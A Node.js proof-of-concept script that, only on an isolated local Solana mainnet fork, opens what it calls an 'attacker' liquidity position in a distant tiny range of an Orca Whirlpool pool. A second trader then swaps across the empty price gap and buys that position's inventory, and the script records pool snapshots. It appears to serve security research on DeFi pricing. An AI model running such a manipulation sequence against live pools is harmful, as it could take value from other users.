#!/usr/bin/env node
'use strict';

// After C7AD has zero liquidity above all pre-existing ranges, create one
// actor-owned distant tiny range on an isolated fork and let an independent
// trader traverse the empty gap, then buy the new LP's A inventory.
const crypto=require('crypto');const fs=require('fs');const path=require('path');
const MOD=require('./runtime.js').nodeModules();
const {Keypair,PublicKey,SystemProgram,TransactionInstruction}=require(`${MOD}/@solana/web3.js`);
const {TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,
  getAssociatedTokenAddressSync}=require(`${MOD}/@solana/spl-token`);
const {PriceMath}=require(`${MOD}/@orca-so/whirlpools-sdk`);
const {encodeV1,signV1}=require('../../2026-10-15/hylo-exchange-v1-wire.js');
const {rpc}=require('./real-flash-envelope.js');
const {POOL,WSOL,USDC,VAULT_A,VAULT_B,actor,ataA,ataB}=require('./one-sided-boundary.js');
const FORK='http://127.0.0.1:64335';
const PROGRAM=new PublicKey('whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc');
const [oracle]=PublicKey.findProgramAddressSync([Buffer.from('oracle'),POOL.toBuffer()],PROGRAM);
const tick=PublicKey.findProgramAddressSync([Buffer.from('tick_array'),POOL.toBuffer(),
  Buffer.from('-28160')],PROGRAM)[0];
const mint=Keypair.fromSeed(crypto.createHash('sha256').update('orca-c7-tiny-lp-mint').digest());
const trader=Keypair.fromSeed(crypto.createHash('sha256').update('orca-c7-correcting-trader').digest());
const [position,bump]=PublicKey.findProgramAddressSync([Buffer.from('position'),mint.publicKey.toBuffer()],PROGRAM);
const nftAta=getAssociatedTokenAddressSync(mint.publicKey,actor.publicKey);
const traderA=getAssociatedTokenAddressSync(WSOL,trader.publicKey);
const traderB=getAssociatedTokenAddressSync(USDC,trader.publicKey);
const L=1_000_000_000n;
const lower=-27480,upper=-27464;
const key=(pubkey,isWritable=false,isSigner=false)=>({pubkey,isWritable,isSigner});
const D=name=>crypto.createHash('sha256').update(`global:${name}`).digest().subarray(0,8);

function open(){
 const data=Buffer.alloc(17);D('open_position').copy(data);data[8]=bump;
 data.writeInt32LE(lower,9);data.writeInt32LE(upper,13);
 return new TransactionInstruction({programId:PROGRAM,data,keys:[
  key(actor.publicKey,true,true),key(actor.publicKey),key(position,true),
  key(mint.publicKey,true,true),key(nftAta,true),key(POOL),key(TOKEN_PROGRAM_ID),
  key(SystemProgram.programId),key(new PublicKey('SysvarRent111111111111111111111111111111111')),
  key(ASSOCIATED_TOKEN_PROGRAM_ID),
 ]});
}
function increase(){
 const data=Buffer.alloc(40);D('increase_liquidity').copy(data);
 data.writeBigUInt64LE(L,8);data.writeBigUInt64LE(0n,16);
 data.writeBigUInt64LE(10_000_000n,24);data.writeBigUInt64LE(0n,32);
 return new TransactionInstruction({programId:PROGRAM,data,keys:[
  key(POOL,true),key(TOKEN_PROGRAM_ID),key(actor.publicKey,false,true),
  key(position,true),key(nftAta),key(ataA,true),key(ataB,true),
  key(VAULT_A,true),key(VAULT_B,true),key(tick,true),key(tick,true),
 ]});
}
function swap(limitTick,amount){
 const data=Buffer.alloc(42);D('swap').copy(data);
 data.writeBigUInt64LE(BigInt(amount),8);
 const limit=BigInt(PriceMath.tickIndexToSqrtPriceX64(limitTick).toString());
 data.writeBigUInt64LE(limit&((1n<<64n)-1n),24);data.writeBigUInt64LE(limit>>64n,32);
 data[40]=1;data[41]=0; // exact B input
 return new TransactionInstruction({programId:PROGRAM,data,keys:[
  key(TOKEN_PROGRAM_ID),key(trader.publicKey,false,true),key(POOL,true),
  key(traderA,true),key(VAULT_A,true),key(traderB,true),key(VAULT_B,true),
  key(tick,true),key(tick,true),key(tick,true),key(oracle),
 ]});
}
function update(){return new TransactionInstruction({programId:PROGRAM,
 data:D('update_fees_and_rewards'),keys:[key(POOL,true),key(position,true),key(tick),key(tick)]});}
async function snapshot(){
 const ks=[POOL,VAULT_A,VAULT_B,ataA,ataB,traderA,traderB,position];
 const {value}=await rpc(FORK,'getMultipleAccounts',[ks.map(k=>k.toBase58()),
  {encoding:'base64',commitment:'processed'}]);
 const b=value.map(v=>v?Buffer.from(v.data[0],'base64'):null);
 const u128=(x,o)=>x.readBigUInt64LE(o)+(x.readBigUInt64LE(o+8)<<64n);
 return {pool:{L:String(u128(b[0],49)),sqrt:String(u128(b[0],65)),tick:b[0].readInt32LE(81),
  protocolFeeOwedA:String(b[0].readBigUInt64LE(85)),
  protocolFeeOwedB:String(b[0].readBigUInt64LE(93))},
  vaultA:String(b[1].readBigUInt64LE(64)),vaultB:String(b[2].readBigUInt64LE(64)),
  lpA:b[3]&&String(b[3].readBigUInt64LE(64)),lpB:b[4]&&String(b[4].readBigUInt64LE(64)),
  traderA:b[5]&&String(b[5].readBigUInt64LE(64)),
  traderB:b[6]&&String(b[6].readBigUInt64LE(64)),
  position:b[7]&&{L:String(u128(b[7],72)),lower:b[7].readInt32LE(88),
    upper:b[7].readInt32LE(92),feeOwedA:String(b[7].readBigUInt64LE(112)),
    feeOwedB:String(b[7].readBigUInt64LE(136))}};
}
async function seedAbsent(ixs){
 const programKeys=new Set(ixs.map(ix=>ix.programId.toBase58()));
 for(const address of new Set(ixs.flatMap(ix=>ix.keys.map(k=>k.pubkey.toBase58())))){
  if(programKeys.has(address))continue;
  const v=(await rpc(FORK,'getAccountInfo',[address,{encoding:'base64',commitment:'processed'}])).value;
  if(!v)await rpc(FORK,'surfnet_setAccount',[address,{
    data:'',executable:false,lamports:0,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 }
}
async function send(label,ixs,payer,signers){
 await seedAbsent(ixs);
 const bh=(await rpc(FORK,'getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
 const encoded=encodeV1(ixs,payer.publicKey,bh,1_400_000);
 const signed=signV1(encoded,ixs,payer.publicKey,bh,signers);
 const sim=(await rpc(FORK,'simulateTransaction',[signed.wire.toString('base64'),
  {encoding:'base64',sigVerify:true,replaceRecentBlockhash:false,commitment:'processed'}])).value;
 const r={label,v1Bytes:encoded.sizeBytes,simulationError:sim.err,
  simulationUnits:sim.unitsConsumed,logs:sim.logs?.slice(-15)};
 if(sim.err)return r;
 const signature=await rpc(FORK,'sendTransaction',[signed.wire.toString('base64'),
  {encoding:'base64',skipPreflight:true,preflightCommitment:'processed'}]);
 let tx;for(let i=0;i<20;i++){tx=await rpc(FORK,'getTransaction',[signature,
  {encoding:'json',commitment:'processed',maxSupportedTransactionVersion:1}]);
  if(tx)break;await new Promise(resolve=>setTimeout(resolve,200));}
 return {...r,signature,slot:tx?.slot,committedError:tx?tx.meta.err:'missing',
  committedUnits:tx?.meta?.computeUnitsConsumed};
}
async function main(){
 if(await rpc(FORK,'getGenesisHash')!==
  '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d')throw Error('Not mainnet fork');
 const start=await snapshot();
 if(start.pool.L!=='0'||start.pool.tick!==-27800)throw Error('Expected completed upper gap move');
 await rpc(FORK,'surfnet_setAccount',[actor.publicKey.toBase58(),{
  data:'',executable:false,lamports:2_000_000_000,
  owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 const wrap=await send('LP wrap 0.1 SOL',[
  SystemProgram.transfer({fromPubkey:actor.publicKey,toPubkey:ataA,lamports:100_000_000}),
  new TransactionInstruction({programId:TOKEN_PROGRAM_ID,keys:[key(ataA,true)],data:Buffer.from([17])}),
 ],actor,[actor]);
 if(wrap.simulationError||wrap.committedError)throw Error('Wrap failed '+JSON.stringify(wrap));
 const opened=await send('open attacker LP position',[open()],actor,[actor,mint]);
 if(opened.simulationError||opened.committedError)throw Error('Open failed '+JSON.stringify(opened));
 const deposited=await send('deposit A-only liquidity',[increase()],actor,[actor]);
 if(deposited.simulationError||deposited.committedError)throw Error('Deposit failed '+JSON.stringify(deposited));
 const afterDeposit=await snapshot();
 await rpc(FORK,'surfnet_setAccount',[trader.publicKey.toBase58(),{
  data:'',executable:false,lamports:1_000_000_000,
  owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 const traderSetup=await send('trader create token accounts',[
  require(`${MOD}/@solana/spl-token`).createAssociatedTokenAccountIdempotentInstruction(
   trader.publicKey,traderA,trader.publicKey,WSOL),
  require(`${MOD}/@solana/spl-token`).createAssociatedTokenAccountIdempotentInstruction(
   trader.publicKey,traderB,trader.publicKey,USDC),
 ],trader,[trader]);
 if(traderSetup.simulationError||traderSetup.committedError)
  throw Error('Trader setup failed '+JSON.stringify(traderSetup));
 const usdc=(await rpc(FORK,'getAccountInfo',[traderB.toBase58(),
  {encoding:'base64',commitment:'processed'}])).value;
 const raw=Buffer.from(usdc.data[0],'base64');raw.writeBigUInt64LE(1_000_000n,64);
 await rpc(FORK,'surfnet_setAccount',[traderB.toBase58(),{
  data:raw.toString('hex'),executable:false,lamports:usdc.lamports,
  owner:TOKEN_PROGRAM_ID.toBase58(),rentEpoch:0}]);
 const beforeTrader=await snapshot();
 const jump=await send('empty gap to new lower tick',[swap(lower,1n)],trader,[trader]);
 const afterJump=await snapshot();
 const trade=await send('buy tiny LP inventory',[swap(upper,1_000_000n)],trader,[trader]);
 const afterTrade=await snapshot();
 const accrual=await send('checkpoint new LP fees',[update()],actor,[actor]);
 const afterAccrual=await snapshot();
 const out=path.join(__dirname,'tiny-lp-after-boundary.json');
 const result={schema:'orca-c7-tiny-lp-after-boundary/v1',mainnetSubmission:false,
  fork:FORK,pool:POOL.toBase58(),position:position.toBase58(),
  lp:actor.publicKey.toBase58(),trader:trader.publicKey.toBase58(),
  newRange:[lower,upper],newLiquidity:String(L),
  forkOnlyTraderUsdcPrefundRaw:'1000000',start,wrap,opened,deposited,afterDeposit,
  traderSetup,beforeTrader,jump,afterJump,trade,afterTrade,accrual,afterAccrual};
 fs.writeFileSync(out,JSON.stringify(result,null,2)+'\n');
 console.log(JSON.stringify({out,start,afterDeposit,beforeTrader,jump,afterJump,
  trade,afterTrade,accrual,afterAccrual}));
}
module.exports={FORK,POOL,PROGRAM,VAULT_A,VAULT_B,actor,ataA,ataB,
  position,nftAta,tick,L,send,snapshot,key,D};
if(require.main===module)main().catch(e=>{console.error(e.stack||e.message);process.exitCode=1;});
